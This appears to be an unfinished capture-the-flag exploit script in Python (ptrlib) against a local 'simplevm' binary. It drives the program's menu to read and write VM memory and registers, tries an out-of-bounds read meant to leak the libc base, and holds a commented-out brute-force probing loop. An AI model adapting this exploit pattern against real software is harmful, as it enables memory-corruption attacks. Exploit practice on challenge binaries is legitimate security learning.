from ptrlib import *
import time

def write_mem(addr, length, data):
    sock.recvuntil("option")
    sock.sendline("2")
    sock.recvuntil("addr:")
    sock.sendline(hex(addr)[2:])
    sock.recvuntil("len:")
    sock.sendline(hex(length)[2:])
    sock.send(data)

def read_mem(addr, length):
    sock.recvuntil("option")
    sock.sendline("3")
    sock.recvuntil("addr:")
    sock.sendline(hex(addr)[2:])
    sock.recvuntil("len:")
    sock.sendline(hex(length)[2:])
    return sock.recvline().rstrip()

def run_vm():
    sock.recvuntil("option")
    sock.sendline("1")

def write_reg(regid, data):
    sock.recvuntil("option")
    sock.sendline("4")
    sock.recvuntil("regid:")
    sock.sendline(hex(regid)[2:])
    sock.sendline(hex(data)[2:])

def read_reg(regid):
    sock.recvuntil("option")
    sock.sendline("5")
    sock.recvuntil("regid:")
    sock.sendline(hex(regid)[2:])
    return int(sock.recvline().rstrip(), 16)

sock = Process("./simplevm")

# leak libc base
payload = b'\x0a\x00' + p32(4) + b'\x00'
print(read_mem(8, -4))

"""
for x in range(0xffffffff, 0, -0x4):
    if x % 0x100 == 0:
        print(hex(x))
    payload = b'\x0a\x00' + p32(x) + b'\x00'
    write_mem(0, len(payload), payload)
    write_reg(0, 0)
    run_vm()
    r = read_reg(0)
    if r != 0:
        print(hex(x), r)
"""
sock.interactive()
